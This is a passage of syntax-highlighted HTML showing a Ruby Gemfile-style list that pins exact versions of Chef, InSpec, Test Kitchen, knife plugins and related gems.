string-literal"><span class="token string">"byebug"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 11.1.3"</span></span>  gem <span class="token string-literal"><span class="token string">"chef"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.10.8"</span></span>  gem <span class="token string-literal"><span class="token string">"chef"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.10.8"</span></span>  gem <span class="token string-literal"><span class="token string">"chef-apply"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.5.3"</span></span>  gem <span class="token string-literal"><span class="token string">"chef-bin"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.10.8"</span></span>  gem <span class="token string-literal"><span class="token string">"chef-cli"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.1.1"</span></span>  gem <span class="token string-literal"><span class="token string">"chef-config"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.10.8"</span></span>  gem <span class="token string-literal"><span class="token string">"chef-telemetry"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.14"</span></span>  gem <span class="token string-literal"><span class="token string">"chef-utils"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.10.8"</span></span>  gem <span class="token string-literal"><span class="token string">"chef-vault"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"chef-zero"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 15.0.4"</span></span>  gem <span class="token string-literal"><span class="token string">"chef_deprecations"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.2"</span></span>  gem <span class="token string-literal"><span class="token string">"cheffish"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.0.12"</span></span>  gem <span class="token string-literal"><span class="token string">"chefspec"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 9.2.1"</span></span>  gem <span class="token string-literal"><span class="token string">"chefstyle"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.7.1"</span></span>  gem <span class="token string-literal"><span class="token string">"citrus"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.2"</span></span>  gem <span class="token string-literal"><span class="token string">"cleanroom"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"coderay"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.3"</span></span>  gem <span class="token string-literal"><span class="token string">"coercible"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"concurrent-ruby"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.8"</span></span>  gem <span class="token string-literal"><span class="token string">"cookbook-omnifetch"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.11.1"</span></span>  gem <span class="token string-literal"><span class="token string">"cookstyle"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 7.8.0"</span></span>  gem <span class="token string-literal"><span class="token string">"debug_inspector"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"declarative"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.20"</span></span>  gem <span class="token string-literal"><span class="token string">"declarative-option"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"dep-selector-libgecode"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3.5"</span></span>  gem <span class="token string-literal"><span class="token string">"dep_selector"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.6"</span></span>  gem <span class="token string-literal"><span class="token string">"descendants_tracker"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.4"</span></span>  gem <span class="token string-literal"><span class="token string">"diff-lcs"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3"</span></span>  gem <span class="token string-literal"><span class="token string">"docker-api"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"domain_name"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.5.20190701"</span></span>  gem <span class="token string-literal"><span class="token string">"droplet_kit"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.13.0"</span></span>  gem <span class="token string-literal"><span class="token string">"ed25519"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.4"</span></span>  gem <span class="token string-literal"><span class="token string">"equalizer"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.11"</span></span>  gem <span class="token string-literal"><span class="token string">"erubi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.10.0"</span></span>  gem <span class="token string-literal"><span class="token string">"erubis"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.7.0"</span></span>  gem <span class="token string-literal"><span class="token string">"excon"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.79.0"</span></span>  gem <span class="token string-literal"><span class="token string">"faraday"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3.0"</span></span>  gem <span class="token string-literal"><span class="token string">"faraday-cookie_jar"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.7"</span></span>  gem <span class="token string-literal"><span class="token string">"faraday-net_http"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.1"</span></span>  gem <span class="token string-literal"><span class="token string">"faraday_middleware"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"fauxhai-ng"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 8.7.0"</span></span>  gem <span class="token string-literal"><span class="token string">"ffi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.14.2"</span></span>  gem <span class="token string-literal"><span class="token string">"ffi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.14.2"</span></span>  gem <span class="token string-literal"><span class="token string">"ffi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.14.2"</span></span>  gem <span class="token string-literal"><span class="token string">"ffi-libarchive"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.17"</span></span>  gem <span class="token string-literal"><span class="token string">"ffi-yajl"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.3.4"</span></span>  gem <span class="token string-literal"><span class="token string">"filesize"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.2.0"</span></span>  gem <span class="token string-literal"><span class="token string">"fog-core"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.2.3"</span></span>  gem <span class="token string-literal"><span class="token string">"fog-json"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.0"</span></span>  gem <span class="token string-literal"><span class="token string">"fog-openstack"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.11"</span></span>  gem <span class="token string-literal"><span class="token string">"formatador"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.2.5"</span></span>  gem <span class="token string-literal"><span class="token string">"fuzzyurl"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.9.0"</span></span>  gem <span class="token string-literal"><span class="token string">"gcewinpass"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"google-api-client"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.42.2"</span></span>  gem <span class="token string-literal"><span class="token string">"googleauth"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.14.0"</span></span>  gem <span class="token string-literal"><span class="token string">"gssapi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3.1"</span></span>  gem <span class="token string-literal"><span class="token string">"guard"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.16.2"</span></span>  gem <span class="token string-literal"><span class="token string">"gyoku"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3.1"</span></span>  gem <span class="token string-literal"><span class="token string">"hashie"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"highline"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.0.3"</span></span>  gem <span class="token string-literal"><span class="token string">"http-cookie"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.3"</span></span>  gem <span class="token string-literal"><span class="token string">"httpclient"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.8.3"</span></span>  gem <span class="token string-literal"><span class="token string">"i18n"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.8.9"</span></span>  gem <span class="token string-literal"><span class="token string">"ice_nine"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.11.2"</span></span>  gem <span class="token string-literal"><span class="token string">"inifile"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"iniparse"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.5.0"</span></span>  gem <span class="token string-literal"><span class="token string">"inspec"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.26.4"</span></span>  gem <span class="token string-literal"><span class="token string">"inspec-bin"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.26.4"</span></span>  gem <span class="token string-literal"><span class="token string">"inspec-core"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.26.4"</span></span>  gem <span class="token string-literal"><span class="token string">"ipaddress"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.8.3"</span></span>  gem <span class="token string-literal"><span class="token string">"jmespath"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.4.0"</span></span>  gem <span class="token string-literal"><span class="token string">"json"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.5.1"</span></span>  gem <span class="token string-literal"><span class="token string">"jwt"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.2.2"</span></span>  gem <span class="token string-literal"><span class="token string">"kartograph"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.2.8"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-azurerm"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.5.0"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-digitalocean"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.11.2"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-dokken"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.11.2"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-ec2"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.8.0"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-google"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.2.0"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-hyperv"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.5.5"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-inspec"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.3.0"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-openstack"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 5.0.1"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-vagrant"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.8.0"</span></span>  gem <span class="token string-literal"><span class="token string">"kitchen-vcenter"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.9.8"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-azure"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.6"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-cloud"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.0.15"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-ec2"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.1.3"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-google"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 5.0.8"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-opc"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.4.7"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-tidy"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.1.2"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-vcenter"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 5.0.5"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-vsphere"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.1.7"</span></span>  gem <span class="token string-literal"><span class="token string">"knife-windows"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.0.6"</span></span>  gem <span class="token string-literal"><span class="token string">"kramdown"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.3.0"</span></span>  gem <span class="token string-literal"><span class="token string">"kramdown-parser-gfm"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"libyajl2"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.0"</span></span>  gem <span class="token string-literal"><span class="token string">"license-acceptance"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.1.13"</span></span>  gem <span class="token string-literal"><span class="token string">"listen"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.4.1"</span></span>  gem <span class="token string-literal"><span class="token string">"little-plugger"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.4"</span></span>  gem <span class="token string-literal"><span class="token string">"lockfile"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.1.3"</span></span>  gem <span class="token string-literal"><span class="token string">"logging"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.3.0"</span></span>  gem <span class="token string-literal"><span class="token string">"lumberjack"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.8"</span></span>  gem <span class="token string-literal"><span class="token string">"mdl"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.11.0"</span></span>  gem <span class="token string-literal"><span class="token string">"memoist"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.16.2"</span></span>  gem <span class="token string-literal"><span class="token string">"method_source"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"mime-types"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.3.1"</span></span>  gem <span class="token string-literal"><span class="token string">"mime-types-data"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.2021.0212"</span></span>  gem <span class="token string-literal"><span class="token string">"mini_mime"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.2"</span></span>  gem <span class="token string-literal"><span class="token string">"mini_portile2"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.4.0"</span></span>  gem <span class="token string-literal"><span class="token string">"minitar"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.9"</span></span>  gem <span class="token string-literal"><span class="token string">"minitest"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 5.13.0"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-archive"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.4"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-archive"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.4"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-authentication"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.7"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-cli"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.1.8"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-config"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.9"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-install"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.12.5"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-log"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.9"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-shellout"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.2.5"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-shellout"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.2.5"</span></span>  gem <span class="token string-literal"><span class="token string">"mixlib-versioning"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.12"</span></span>  gem <span class="token string-literal"><span class="token string">"molinillo"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.7.0"</span></span>  gem <span class="token string-literal"><span class="token string">"ms_rest"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.7.6"</span></span>  gem <span class="token string-literal"><span class="token string">"ms_rest_azure"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.12.0"</span></span>  gem <span class="token string-literal"><span class="token string">"multi_json"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.15.0"</span></span>  gem <span class="token string-literal"><span class="token string">"multipart-post"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.1.1"</span></span>  gem <span class="token string-literal"><span class="token string">"nenv"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.3.0"</span></span>  gem <span class="token string-literal"><span class="token string">"net-ping"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.0.8"</span></span>  gem <span class="token string-literal"><span class="token string">"net-scp"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"net-sftp"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"net-ssh"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 6.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"net-ssh-gateway"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"net-ssh-multi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.1"</span></span>  gem <span class="token string-literal"><span class="token string">"netaddr"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.5.1"</span></span>  gem <span class="token string-literal"><span class="token string">"nokogiri"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.10.10"</span></span>  gem <span class="token string-literal"><span class="token string">"nokogiri"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.10.10"</span></span>  gem <span class="token string-literal"><span class="token string">"nokogiri"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.10.10"</span></span>  gem <span class="token string-literal"><span class="token string">"nori"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.6.0"</span></span>  gem <span class="token string-literal"><span class="token string">"notiffany"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.3"</span></span>  gem <span class="token string-literal"><span class="token string">"octokit"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.20.0"</span></span>  gem <span class="token string-literal"><span class="token string">"ohai"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 16.10.6"</span></span>  gem <span class="token string-literal"><span class="token string">"optimist"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.1"</span></span>  gem <span class="token string-literal"><span class="token string">"os"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.1"</span></span>  gem <span class="token string-literal"><span class="token string">"parallel"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.20.1"</span></span>  gem <span class="token string-literal"><span class="token string">"parser"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"parslet"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.8.2"</span></span>  gem <span class="token string-literal"><span class="token string">"pastel"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.8.0"</span></span>  gem <span class="token string-literal"><span class="token string">"plist"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.6.0"</span></span>  gem <span class="token string-literal"><span class="token string">"proxifier"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.3"</span></span>  gem <span class="token string-literal"><span class="token string">"pry"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.13.1"</span></span>  gem <span class="token string-literal"><span class="token string">"pry-byebug"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.9.0"</span></span>  gem <span class="token string-literal"><span class="token string">"pry-remote"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.8"</span></span>  gem <span class="token string-literal"><span class="token string">"pry-stack_explorer"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.6.1"</span></span>  gem <span class="token string-literal"><span class="token string">"public_suffix"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.0.6"</span></span>  gem <span class="token string-literal"><span class="token string">"r18n-core"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"r18n-desktop"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"rack"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.2.3"</span></span>  gem <span class="token string-literal"><span class="token string">"rainbow"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"rake"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 13.0.1"</span></span>  gem <span class="token string-literal"><span class="token string">"rb-fsevent"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.10.4"</span></span>  gem <span class="token string-literal"><span class="token string">"rb-inotify"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.10.1"</span></span>  gem <span class="token string-literal"><span class="token string">"rb-readline"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.5.5"</span></span>  gem <span class="token string-literal"><span class="token string">"rbvmomi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"regexp_parser"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.0.3"</span></span>  gem <span class="token string-literal"><span class="token string">"representable"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.4"</span></span>  gem <span class="token string-literal"><span class="token string">"resource_kit"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.7"</span></span>  gem <span class="token string-literal"><span class="token string">"retriable"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.1.2"</span></span>  gem <span class="token string-literal"><span class="token string">"retryable"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.5"</span></span>  gem <span class="token string-literal"><span class="token string">"rexml"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.2.4"</span></span>  gem <span class="token string-literal"><span class="token string">"rspec"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.10.0"</span></span>  gem <span class="token string-literal"><span class="token string">"rspec-core"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.10.1"</span></span>  gem <span class="token string-literal"><span class="token string">"rspec-expectations"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.10.1"</span></span>  gem <span class="token string-literal"><span class="token string">"rspec-its"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3.0"</span></span>  gem <span class="token string-literal"><span class="token string">"rspec-mocks"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.10.2"</span></span>  gem <span class="token string-literal"><span class="token string">"rspec-support"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.10.2"</span></span>  gem <span class="token string-literal"><span class="token string">"rubocop"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.10.0"</span></span>  gem <span class="token string-literal"><span class="token string">"rubocop-ast"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.4.1"</span></span>  gem <span class="token string-literal"><span class="token string">"ruby-progressbar"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.11.0"</span></span>  gem <span class="token string-literal"><span class="token string">"ruby-shadow"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.5.0"</span></span>  gem <span class="token string-literal"><span class="token string">"ruby2_keywords"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.4"</span></span>  gem <span class="token string-literal"><span class="token string">"rubyntlm"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.6.3"</span></span>  gem <span class="token string-literal"><span class="token string">"rubyzip"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.3.0"</span></span>  gem <span class="token string-literal"><span class="token string">"sawyer"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.8.2"</span></span>  gem <span class="token string-literal"><span class="token string">"semverse"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"shellany"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.0.1"</span></span>  gem <span class="token string-literal"><span class="token string">"signet"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.14.1"</span></span>  gem <span class="token string-literal"><span class="token string">"slop"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.6.0"</span></span>  gem <span class="token string-literal"><span class="token string">"solve"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 4.0.4"</span></span>  gem <span class="token string-literal"><span class="token string">"sshkey"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"sslshake"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.3.1"</span></span>  gem <span class="token string-literal"><span class="token string">"strings"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.2.0"</span></span>  gem <span class="token string-literal"><span class="token string">"strings-ansi"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.2.0"</span></span>  gem <span class="token string-literal"><span class="token string">"syslog-logger"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.6.8"</span></span>  gem <span class="token string-literal"><span class="token string">"test-kitchen"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.10.0"</span></span>  gem <span class="token string-literal"><span class="token string">"thor"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"thread_safe"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.3.6"</span></span>  gem <span class="token string-literal"><span class="token string">"timeliness"</span></span><span class="token punctuation">,</span> <span 